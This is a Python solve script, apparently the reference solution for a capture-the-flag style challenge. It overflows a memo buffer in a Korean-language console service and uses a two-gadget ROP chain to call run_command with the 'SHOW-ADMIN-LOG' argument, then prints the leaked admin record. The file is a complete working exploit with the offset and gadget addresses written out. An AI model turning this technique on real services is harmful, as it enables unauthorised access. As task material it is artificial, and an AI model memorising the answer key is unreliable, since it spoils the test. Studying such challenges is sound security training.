"""Overflow the memo buffer with a two-gadget call sequence: `pop_rdi_ret`
loads the address of the already-present "SHOW-ADMIN-LOG" string into rdi,
then control passes to `run_command`, which only reaches its admin branch
when called with that exact argument; see solve/README.md for how the
offset and the three addresses were found.
"""
import socket
import struct
import sys

HOST, PORT = 'app', 9300
PROMPT1 = '명령을 입력하세요 (STATUS): '.encode()
PROMPT2 = '메모를 입력하세요: '.encode()
STATUS_REPLY = '상태: 정상\n'.encode()
BUF_TO_RETADDR = 104  # files/console: objdump shows buf at rbp-0x60, saved rip at rbp+8
POP_RDI_RET = 0x401248   # nm files/console | grep pop_rdi_ret
STR_ADDR = 0x40201E      # objdump -d run_command: lea ...,[rip+...] loading "SHOW-ADMIN-LOG"
RUN_COMMAND = 0x401196   # nm files/console | grep run_command


def read_exact(sock, size):
    data = b''
    while len(data) < size:
        chunk = sock.recv(size - len(data))
        if not chunk:
            break
        data += chunk
    return data


def main():
    with socket.create_connection((HOST, PORT), timeout=10) as sock:
        sock.settimeout(10)
        sock.sendall(b'STATUS\n')
        total = len(PROMPT1) + len(STATUS_REPLY) + len(PROMPT2)
        stage1 = read_exact(sock, total)
        if len(stage1) != total:
            print('stage 1 was rejected before the memo could be sent: ' + repr(stage1), file=sys.stderr)
            raise SystemExit(3)

        payload = (b'A' * BUF_TO_RETADDR
                   + struct.pack('<Q', POP_RDI_RET)
                   + struct.pack('<Q', STR_ADDR)
                   + struct.pack('<Q', RUN_COMMAND))
        sock.sendall(payload)
        sock.shutdown(socket.SHUT_WR)

        out = b''
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            out += chunk
    text = out.decode('utf-8', 'replace')
    for line in text.splitlines():
        if line.startswith('관리자 기록: '):
            print(line.split(': ', 1)[1].strip())
            return
    print('run_command was not reached with the admin argument: ' + text, file=sys.stderr)
    raise SystemExit(3)


if __name__ == '__main__':
    main()
